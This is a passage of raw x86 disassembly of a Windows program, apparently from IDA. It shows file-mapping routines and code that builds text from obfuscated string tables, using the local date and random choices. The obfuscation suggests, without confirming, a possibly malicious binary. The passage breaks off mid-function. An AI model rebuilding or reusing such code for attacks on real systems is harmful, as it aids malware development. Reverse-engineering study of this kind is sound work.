		push	edi
		push	2
		pop	edx
		mov	esi, ecx
		push	4
		xor	edi, edi
		cmp	[ebp+arg_8], edi
		pop	ecx
		mov	eax, 80000000h
		mov	ebx, edx
		mov	[ebp+dwDesiredAccess], ecx
		mov	[ebp+FileSizeHigh], edi
		mov	[esi], edi
		mov	[esi+4], edi
		mov	[esi+8], edi
		jnz	short loc_401784
		mov	eax, 0C0000000h
		mov	ebx, ecx
		mov	[ebp+dwDesiredAccess], edx

loc_401784:				; CODE XREF: sub_40174E+2Aj
		cmp	[ebp+lpFileName], edi
		jz	short loc_4017BE
		push	edi		; hTemplateFile
		push	20h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	edi		; lpSecurityAttributes
		push	1		; dwShareMode
		push	eax		; dwDesiredAccess
		push	[ebp+lpFileName] ; lpFileName
		call	ds:CreateFileA
		cmp	eax, 0FFFFFFFFh
		mov	[esi], eax
		jz	short loc_4017FF
		lea	ecx, [ebp+FileSizeHigh]
		push	ecx		; lpFileSizeHigh
		push	eax		; hFile
		call	ds:GetFileSize
		cmp	[ebp+FileSizeHigh], edi
		mov	[esi+0Ch], eax
		jnz	short loc_4017D2
		mov	ecx, [ebp+arg_4]
		cmp	ecx, edi
		jz	short loc_4017BE
		mov	[ecx], eax

loc_4017BE:				; CODE XREF: sub_40174E+39j
					; sub_40174E+6Cj
		push	edi		; lpName
		push	edi		; dwMaximumSizeLow
		push	edi		; dwMaximumSizeHigh
		push	ebx		; flProtect
		push	edi		; lpFileMappingAttributes
		push	dword ptr [esi]	; hFile
		call	ds:CreateFileMappingA
		cmp	eax, edi
		mov	[esi+4], eax
		jnz	short loc_4017DC

loc_4017D2:				; CODE XREF: sub_40174E+65j
		push	dword ptr [esi]	; hObject
		call	ds:CloseHandle
		jmp	short loc_4017FF
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4017DC:				; CODE XREF: sub_40174E+82j
		push	edi		; dwNumberOfBytesToMap
		push	edi		; dwFileOffsetLow
		push	edi		; dwFileOffsetHigh
		push	[ebp+dwDesiredAccess] ;	dwDesiredAccess
		push	eax		; hFileMappingObject
		call	ds:MapViewOfFile
		cmp	eax, edi
		mov	[esi+8], eax
		jnz	short loc_401801
		push	dword ptr [esi+4] ; hObject
		mov	edi, ds:CloseHandle
		call	edi ; CloseHandle
		push	dword ptr [esi]	; hObject
		call	edi ; CloseHandle

loc_4017FF:				; CODE XREF: sub_40174E+52j
					; sub_40174E+8Cj
		xor	eax, eax

loc_401801:				; CODE XREF: sub_40174E+A0j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
sub_40174E	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_401808	proc near		; CODE XREF: sub_403944+13Ep
					; sub_403944+160p ...
		push	esi
		mov	esi, ecx
		push	edi
		mov	eax, [esi+8]
		test	eax, eax
		jz	short loc_40181A
		push	eax		; lpBaseAddress
		call	ds:UnmapViewOfFile

loc_40181A:				; CODE XREF: sub_401808+9j
		mov	eax, [esi+4]
		mov	edi, ds:CloseHandle
		test	eax, eax
		jz	short loc_40182A
		push	eax		; hObject
		call	edi ; CloseHandle

loc_40182A:				; CODE XREF: sub_401808+1Dj
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_401833
		push	eax		; hObject
		call	edi ; CloseHandle

loc_401833:				; CODE XREF: sub_401808+26j
		and	dword ptr [esi], 0
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		pop	edi
		pop	esi
		retn
sub_401808	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_401841	proc near		; CODE XREF: sub_405FE9+2Ep

arg_0		= dword	ptr  0Ch

		push	ebx
		push	esi
		mov	esi, [esp+arg_0]
		xor	ebx, ebx
		push	edi
		push	ebx
		call	sub_4046AB
		and	eax, 1
		push	7
		mov	[esi+91Ch], eax
		push	26h
		lea	eax, [esi+8B8h]
		push	0Ah
		push	eax
		call	sub_403624
		add	esp, 14h
		cmp	byte_491CF0, bl
		jz	short loc_401889
		lea	eax, [esi+7B4h]
		push	offset byte_491CF0 ; char *
		push	eax		; char *
		call	_strcpy
		pop	ecx
		pop	ecx

loc_401889:				; CODE XREF: sub_401841+33j
		push	esi
		call	sub_401A1E
		movsx	eax, byte ptr [esi+12Ch]
		lea	edi, [esi+12Ch]
		push	eax		; int
		call	_toupper
		cmp	[esi+1ACh], bl
		pop	ecx
		pop	ecx
		mov	[edi], al
		jnz	short loc_4018B8
		mov	dword ptr [esi+91Ch], 1

loc_4018B8:				; CODE XREF: sub_401841+6Bj
		cmp	[esi+6B0h], bl
		lea	edi, [esi+6B0h]
		jnz	short loc_4018E5
		push	1
		push	dword ptr [esi+920h]
		push	offset aYRNyWnyvNy_Tnn ; "yÜRÜny×ßWnyVÚ]ny_ŞTnnnnnnnnnnnnnyTRTnyZ"...
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		push	ebx
		push	edi
		call	sub_404156
		add	esp, 10h

loc_4018E5:				; CODE XREF: sub_401841+83j
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_401841	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4018E9	proc near		; CODE XREF: sub_401A1E+8Bp

SystemTime	= _SYSTEMTIME ptr -1Ch
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 1Ch
		push	ebx
		push	esi
		lea	eax, [ebp+SystemTime]
		push	edi
		push	eax		; lpSystemTime
		call	ds:GetLocalTime
		xor	ebx, ebx
		mov	esi, offset unk_40F6C2
		push	ebx
		push	esi
		call	sub_403464
		pop	ecx
		cmp	eax, ebx
		pop	ecx
		mov	[ebp+var_C], eax
		jle	loc_401A17
		mov	edi, offset unk_40D210

loc_40191C:				; CODE XREF: sub_4018E9+9Ej
		xor	eax, eax
		cmp	edi, offset unk_40D220
		setnl	al
		dec	eax
		mov	ecx, [edi]
		and	eax, 0Ah
		mov	[ebp+var_4], ecx
		add	eax, 5
		mov	[ebp+var_8], ecx
		neg	eax
		push	eax
		lea	eax, [ebp+var_4]
		push	eax
		call	sub_404A4C
		pop	ecx
		pop	ecx
		mov	cx, word ptr [ebp+var_8]
		cmp	word ptr [ebp+var_4], cx
		jle	short loc_401957
		add	cx, 0Ch
		add	word ptr [ebp+var_8+2],	1Eh

loc_401957:				; CODE XREF: sub_4018E9+63j
		movzx	eax, [ebp+SystemTime.wMonth]
		movsx	edx, word ptr [ebp+var_4]
		cmp	edx, eax
		jg	short loc_401980
		movsx	ecx, cx
		cmp	eax, ecx
		jg	short loc_401980
		movzx	eax, [ebp+SystemTime.wDay]
		movsx	ecx, word ptr [ebp+var_4+2]
		cmp	ecx, eax
		jg	short loc_401980
		movsx	ecx, word ptr [ebp+var_8+2]
		inc	ecx
		inc	ecx
		cmp	eax, ecx
		jle	short loc_401989

loc_401980:				; CODE XREF: sub_4018E9+78j
					; sub_4018E9+7Fj ...
		inc	ebx
		add	edi, 4
		cmp	ebx, [ebp+var_C]
		jl	short loc_40191C

loc_401989:				; CODE XREF: sub_4018E9+95j
		cmp	ebx, [ebp+var_C]
		jge	loc_401A17
		push	ebx
		push	esi
		call	sub_403434
		push	0
		mov	ebx, eax
		call	sub_4046AB
		mov	esi, eax
		mov	eax, [ebp+arg_0]
		and	esi, 1
		push	esi
		push	offset unk_40F742
		lea	edi, [eax+12Ch]
		call	sub_403434
		push	eax		; char *
		push	edi		; char *
		call	_strcpy
		push	0
		call	sub_4046AB
		add	esp, 20h
		xor	edx, edx
		push	3
		pop	ecx
		div	ecx
		test	edx, edx
		jz	short loc_4019DB
		test	esi, esi
		jz	short loc_401A09

loc_4019DB:				; CODE XREF: sub_4018E9+ECj
		push	0
		call	sub_4046AB
		push	6
		xor	edx, edx
		pop	ecx
		div	ecx
		push	edx
		push	offset unk_40F396
		call	sub_403434
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		push	offset asc_40E038 ; char *
		push	edi		; char *
		call	_strcat
		add	esp, 1Ch

loc_401A09:				; CODE XREF: sub_4018E9+F0j
		push	ebx		; char *
		push	edi		; char *
		call	_strcat
		pop	ecx
		pop	ecx
		push	1
		pop	eax
		jmp	short loc_401A19
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401A17:				; CODE XREF: sub_4018E9+28j
					; sub_4018E9+A3j
		xor	eax, eax

loc_401A19:				; CODE XREF: sub_4018E9+12Cj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4018E9	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401A1E	proc near		; CODE XREF: sub_401841+49p

var_C08		= byte ptr -0C08h
var_BA4		= byte ptr -0BA4h
var_808		= byte ptr -808h
var_408		= byte ptr -408h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0C08h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		lea	eax, [ebp+var_808]
		push	edi
		push	eax
		lea	eax, [ebp+var_C08]
		xor	ebx, ebx
		push	eax
		lea	eax, [esi+64h]
		push	eax
		mov	[ebp+var_4], ebx
		mov	[ebp+var_C08], bl
		call	sub_403AAD
		lea	eax, [esi+1ACh]
		push	ebx
		mov	[ebp+var_8], eax
		push	offset aYRNyWnyvNy_Tnn ; "yÜRÜny×ßWnyVÚ]ny_ŞTnnnnnnnnnnnnnyTRTnyZ"...
		mov	[eax], bl
		lea	eax, [esi+12Ch]
		mov	[ebp+var_BA4], bl
		mov	[ebp+var_408], bl
		mov	[ebp+arg_0], eax
		mov	[eax], bl
		mov	[esi+6B0h], bl
		call	sub_403464
		push	ebx
		mov	edi, eax
		call	sub_4046AB
		xor	edx, edx
		push	ebx
		div	edi
		mov	[esi+920h], edx
		call	sub_4046AB
		add	esp, 1Ch
		xor	edx, edx
		push	3
		pop	ecx
		div	ecx
		test	edx, edx
		jnz	short loc_401AB7
		push	esi
		call	sub_4018E9
		test	eax, eax
		pop	ecx
		jnz	loc_401DBF

loc_401AB7:				; CODE XREF: sub_401A1E+88j
		push	ebx
		call	sub_4046AB
		test	al, 0Fh
		pop	ecx
		jnz	loc_401B6D
		mov	[ebp+var_4], 1

loc_401ACD:				; CODE XREF: sub_401A1E+16Dj
					; sub_401A1E+179j ...
		push	ebx
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	3
		pop	ecx
		div	ecx
		test	edx, edx
		jz	loc_401CD4
		cmp	[ebp+var_4], ebx
		jnz	loc_401CD4
		mov	edi, offset unk_40F3E2
		push	ebx
		push	edi
		call	sub_403464
		push	ebx
		mov	[ebp+var_8], eax
		call	sub_4046AB
		xor	edx, edx
		div	[ebp+var_8]
		push	edx
		push	edi
		call	sub_403434
		push	ebx
		mov	edi, eax
		call	sub_4046AB
		add	esp, 18h
		xor	edx, edx
		push	3
		pop	ecx
		div	ecx
		test	edx, edx
		jnz	loc_401CC4
		push	ebx
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	0Ah
		pop	ecx
		div	ecx
		test	edx, edx
		jnz	loc_401C64
		push	edi
		push	ebx
		call	sub_4046AB
		and	eax, 1
		add	eax, 4
		push	eax
		push	(offset	aTW@WT@Y@WwYteW+0BEh)
		call	sub_403434
		add	esp, 0Ch
		push	eax
		push	[ebp+arg_0]
		call	_sprintf
		push	edi

loc_401B62:				; CODE XREF: sub_401A1E+1F5j
		push	esi
		call	sub_4021CE
		jmp	loc_401DBC
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401B6D:				; CODE XREF: sub_401A1E+A2j
		push	ebx
		call	sub_4046AB
		test	al, 1Fh
		pop	ecx
		jnz	short loc_401B82
		push	offset asc_40E038 ; " "
		jmp	loc_401CC5
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401B82:				; CODE XREF: sub_401A1E+158j
		push	ebx
		call	sub_4046AB
		test	al, 1
		pop	ecx
		jnz	loc_401ACD
		cmp	byte_491DF4, bl
		jz	loc_401ACD
		push	1
		push	32h
		lea	eax, [ebp+var_408]
		push	8
		mov	edi, offset byte_491DF4
		push	eax
		push	edi
		call	sub_403944
		add	esp, 14h
		test	eax, eax
		jz	loc_401ACD
		push	ebx
		mov	dword ptr [esi+91Ch], 1
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	0Ah
		mov	[ebp+var_808], bl
		pop	ecx
		div	ecx
		lea	eax, [ebp+var_408]
		push	eax		; char *
		cmp	edx, ebx
		jnz	short loc_401C18
		push	ebx
		call	sub_4046AB
		and	eax, 1
		add	eax, 4
		push	eax
		push	(offset	aTW@WT@Y@WwYteW+0BEh)
		call	sub_403434
		add	esp, 0Ch
		push	eax
		push	[ebp+arg_0]
		call	_sprintf
		lea	eax, [ebp+var_408]
		push	eax
		jmp	loc_401B62
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401C18:				; CODE XREF: sub_401A1E+1C9j
		push	[ebp+arg_0]	; char *
		call	_strcpy
		push	ebx
		call	sub_4046AB
		add	esp, 0Ch
		test	al, 1Fh
		jnz	loc_401DBF
		push	1
		push	320h
		lea	eax, [ebp+var_808]
		push	8
		push	eax
		push	edi
		mov	[ebp+var_808], bl
		call	sub_403944
		lea	eax, [ebp+var_808]
		push	eax		; char *
		push	[ebp+var_8]	; char *
		call	_strcpy
		add	esp, 1Ch
		jmp	loc_401DBF
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401C64:				; CODE XREF: sub_401A1E+119j
		push	ebx
		call	sub_4046AB
		and	eax, 3
		push	eax
		push	(offset	aTW@WT@Y@WwYteW+0BEh)
		call	sub_403434
		mov	esi, [ebp+arg_0]
		push	eax		; char *
		push	esi		; char *
		call	_strcpy
		push	ebx
		call	sub_4046AB
		add	esp, 18h
		test	al, 1
		jz	short loc_401CAA
		lea	eax, [ebp+var_C08]
		push	eax		; char *
		push	esi		; char *
		call	_strcat
		push	offset asc_40E03C ; char *
		push	esi		; char *
		call	_strcat
		add	esp, 10h

loc_401CAA:				; CODE XREF: sub_401A1E+26Fj
		movsx	eax, byte ptr [edi]
		push	eax		; int
		call	_tolower
		push	edi		; char *
		push	esi		; char *
		mov	[edi], al
		call	_strcat
		add	esp, 0Ch
		jmp	loc_401DBF
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401CC4:				; CODE XREF: sub_401A1E+103j
		push	edi		; char *

loc_401CC5:				; CODE XREF: sub_401A1E+15Fj
		push	[ebp+arg_0]	; char *
		call	_strcpy
		pop	ecx
		pop	ecx
		jmp	loc_401DBF
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401CD4:				; CODE XREF: sub_401A1E+BFj
					; sub_401A1E+C8j
		push	ebx
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	5
		pop	ecx
		div	ecx
		cmp	[ebp+var_4], ebx
		mov	edi, edx
		jz	short loc_401CEB
		xor	edi, edi

loc_401CEB:				; CODE XREF: sub_401A1E+2C9j
		mov	eax, ds:dword_40D1E8[edi*4]
		push	ebx
		mov	[ebp+var_4], eax
		mov	eax, ds:dword_40D1FC[edi*4]
		mov	[ebp+var_8], eax
		call	sub_4046AB
		xor	edx, edx
		pop	ecx
		div	[ebp+var_8]
		add	[ebp+var_4], edx
		cmp	edi, 4
		jge	short loc_401D76
		push	ebx
		call	sub_4046AB
		test	al, 1
		pop	ecx
		jnz	short loc_401D41
		cmp	edi, 3
		jz	short loc_401D41
		push	ebx
		call	sub_4046AB
		and	eax, 1
		add	eax, 8
		push	eax
		push	(offset	aMwSNdSN_TsNnnd+18h)
		call	sub_403434
		add	esp, 0Ch
		mov	ebx, eax
		jmp	short loc_401D46
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401D41:				; CODE XREF: sub_401A1E+2FEj
					; sub_401A1E+303j
		mov	ebx, offset unk_4119B0

loc_401D46:				; CODE XREF: sub_401A1E+321j
		push	[ebp+var_4]
		push	offset unk_40F396
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		push	ebx
		push	edi
		push	offset unk_40F346
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		lea	eax, [ebp+var_408]
		push	eax
		call	_sprintf
		add	esp, 10h
		jmp	short loc_401DA3
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401D76:				; CODE XREF: sub_401A1E+2F3j
		push	[ebp+var_4]
		push	offset unk_40F396
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		push	edi
		push	offset unk_40F346
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		lea	eax, [ebp+var_408]
		push	eax
		call	_sprintf
		add	esp, 0Ch

loc_401DA3:				; CODE XREF: sub_401A1E+356j
		lea	eax, [ebp+var_408]
		push	eax		; char *
		push	[ebp+arg_0]	; char *
		call	_strcpy
		push	[ebp+var_4]
		push	edi
		push	esi
		call	sub_401DC4

loc_401DBC:				; CODE XREF: sub_401A1E+14Aj
		add	esp, 14h

loc_401DBF:				; CODE XREF: sub_401A1E+93j
					; sub_401A1E+20Dj ...
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_401A1E	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401DC4	proc near		; CODE XREF: sub_401A1E+399p

var_260		= byte ptr -260h
var_198		= byte ptr -198h
var_D0		= byte ptr -0D0h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 260h
		cmp	[ebp+arg_4], 4
		push	ebx
		push	esi
		push	edi
		jz	loc_401F73
		xor	ebx, ebx
		push	ebx
		call	sub_4046AB
		test	al, 1
		pop	ecx
		mov	esi, (offset aMwSNdSN_TsNnnd+18h)
		jnz	short loc_401E0C
		cmp	[ebp+arg_4], 3
		jz	short loc_401E0C
		push	ebx
		call	sub_4046AB
		and	eax, 1
		add	eax, 8
		push	eax
		push	esi
		call	sub_403434
		add	esp, 0Ch
		mov	edi, eax
		jmp	short loc_401E11
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401E0C:				; CODE XREF: sub_401DC4+26j
					; sub_401DC4+2Cj
		mov	edi, offset unk_4119B0

loc_401E11:				; CODE XREF: sub_401DC4+46j
		push	[ebp+arg_8]
		push	offset unk_40F396
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		push	edi
		push	[ebp+arg_4]
		push	offset unk_40F346
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		lea	eax, [ebp+var_198]
		push	eax
		call	_sprintf
		push	ebx
		call	sub_4046AB
		and	eax, 1
		add	eax, 10h
		push	eax
		push	esi
		call	sub_403434
		add	esp, 1Ch
		push	eax
		push	ebx
		call	sub_4046AB
		push	3
		xor	edx, edx
		pop	ecx
		div	ecx
		add	edx, 12h
		push	edx
		push	esi
		call	sub_403434
		add	esp, 0Ch
		push	eax
		push	0Fh
		push	esi
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		lea	eax, [ebp+var_D0]
		push	eax
		call	_sprintf
		push	ebx
		call	sub_4046AB
		add	esp, 14h
		test	al, 1
		jnz	short loc_401EBA
		push	ebx
		call	sub_4046AB
		and	eax, 1
		push	eax
		push	(offset	aTW@WT@Y@WwYteW+0BEh)
		call	sub_403434
		push	eax		; char *
		mov	eax, [ebp+arg_0]
		add	eax, 1ACh
		push	eax		; char *
		call	_strcpy
		add	esp, 14h

loc_401EBA:				; CODE XREF: sub_401DC4+CEj
		mov	eax, [ebp+arg_0]
		push	0Eh
		push	esi
		lea	edi, [eax+1ACh]
		mov	[ebp+arg_8], edi
		call	sub_403434
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		lea	eax, [ebp+var_198]
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		add	esp, 18h
		cmp	[ebp+arg_4], ebx
		mov	edi, offset aP_wqsknsknvTTW ; "p_WqèknèknVÙ×TØŞ×TÜWnnnÅÚYÛnnÊØŞİÜFŞTZn"...
		jnz	short loc_401F53
		push	edi		; char *
		push	[ebp+arg_8]	; char *
		call	_strcat
		push	offset aDzWTWYp_wqsk ; char *
		push	[ebp+arg_8]	; char *
		call	_strcat
		mov	esi, [ebp+arg_0]
		push	ebx
		push	offset unk_40FD50
		mov	[esi+91Ch], ebx
		mov	[esi+920h], ebx
		call	sub_403464
		push	ebx
		mov	[ebp+var_4], eax
		add	esi, 6B0h
		call	sub_4046AB
		xor	edx, edx
		div	[ebp+var_4]
		push	edx
		push	offset unk_40FD50
		call	sub_403434
		push	eax		; char *
		push	esi		; char *
		call	_strcpy
		push	offset aYRNyWnyvNy_Tnn ; char *
		push	esi		; char *
		call	_strcat
		add	esp, 34h

loc_401F53:				; CODE XREF: sub_401DC4+129j
		push	edi		; char *
		push	[ebp+arg_8]	; char *
		call	_strcat
		lea	eax, [ebp+var_D0]
		push	eax		; char *
		push	[ebp+arg_8]	; char *
		call	_strcat
		add	esp, 10h
		jmp	loc_4021C9
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401F73:				; CODE XREF: sub_401DC4+10j
		xor	ebx, ebx
		push	ebx
		call	sub_4046AB
		and	eax, 1
		mov	esi, offset unk_40F548
		mov	[ebp+var_4], eax
		mov	eax, [ebp+arg_0]
		push	ebx
		push	esi
		mov	[eax+91Ch], ebx
		mov	[eax+920h], ebx
		call	sub_403464
		push	ebx
		mov	edi, eax
		call	sub_4046AB
		xor	edx, edx
		div	edi
		push	edx
		push	esi
		call	sub_403434
		mov	[ebp+var_8], eax
		push	eax		; char *
		lea	eax, [ebp+var_198]
		push	eax		; char *
		call	_strcpy
		push	ebx
		call	sub_4046AB
		add	esp, 24h
		mov	esi, (offset aMwSNdSN_TsNnnd+18h)
		test	al, 1
		jz	short loc_401FDA
		mov	[ebp+arg_4], offset unk_4119B0
		jmp	short loc_401FF3
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401FDA:				; CODE XREF: sub_401DC4+20Bj
		push	ebx
		call	sub_4046AB
		and	eax, 1
		add	eax, 8
		push	eax
		push	esi
		call	sub_403434
		add	esp, 0Ch
		mov	[ebp+arg_4], eax

loc_401FF3:				; CODE XREF: sub_401DC4+214j
		push	[ebp+arg_4]
		push	4
		push	esi
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		lea	eax, [ebp+var_D0]
		push	eax
		call	_sprintf
		lea	eax, [ebp+var_D0]
		push	eax		; char *
		lea	eax, [ebp+var_198]
		push	eax		; char *
		call	_strcat
		mov	edi, [ebp+arg_8]
		push	edi
		push	offset unk_40F396
		call	sub_403434
		add	esp, 1Ch
		mov	[ebp+arg_8], eax
		push	eax
		push	4
		push	offset unk_40F346
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		lea	eax, [ebp+var_D0]
		push	eax
		call	_sprintf
		lea	eax, [ebp+var_D0]
		push	eax		; char *
		lea	eax, [ebp+var_198]
		push	eax		; char *
		call	_strcat
		push	[ebp+arg_8]	; char *
		lea	eax, [ebp+var_D0]
		push	eax		; char *
		call	_strcpy
		sub	edi, ds:dword_40D1F8
		add	edi, 6
		push	edi
		push	esi
		call	sub_403434
		add	esp, 24h
		push	eax
		push	[ebp+arg_4]
		push	5
		push	esi
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		lea	eax, [ebp+var_260]
		push	eax
		call	_sprintf
		lea	eax, [ebp+var_260]
		push	eax		; char *
		lea	eax, [ebp+var_D0]
		push	eax		; char *
		call	_strcat
		mov	eax, [ebp+arg_0]
		add	esp, 18h
		cmp	[ebp+var_4], ebx
		jz	short loc_4020EC
		lea	ecx, [ebp+var_198]
		add	eax, 1ACh
		push	ecx		; char *
		push	eax		; char *
		call	_strcpy
		mov	eax, [ebp+arg_0]
		mov	edi, offset aP_wqsknsknvTTW ; "p_WqèknèknVÙ×TØŞ×TÜWnnnÅÚYÛnnÊØŞİÜFŞTZn"...
		add	eax, 1ACh
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_D0]
		jmp	short loc_402118
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4020EC:				; CODE XREF: sub_401DC4+2F8j
		lea	ecx, [ebp+var_D0]
		add	eax, 1ACh
		push	ecx		; char *
		push	eax		; char *
		call	_strcpy
		mov	eax, [ebp+arg_0]
		mov	edi, offset aP_wqsknsknvTTW ; "p_WqèknèknVÙ×TØŞ×TÜWnnnÅÚYÛnnÊØŞİÜFŞTZn"...
		add	eax, 1ACh
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_198]

loc_402118:				; CODE XREF: sub_401DC4+326j
		push	eax		; char *
		mov	eax, [ebp+arg_0]
		add	eax, 1ACh
		push	eax		; char *
		call	_strcat
		mov	eax, [ebp+arg_0]
		add	esp, 18h
		add	eax, 1ACh
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		mov	eax, [ebp+arg_0]
		push	edi		; char *
		lea	edi, [eax+1ACh]
		push	edi		; char *
		call	_strcat
		push	0Dh
		push	esi
		call	sub_403434
		push	eax		; char *
		push	edi		; char *
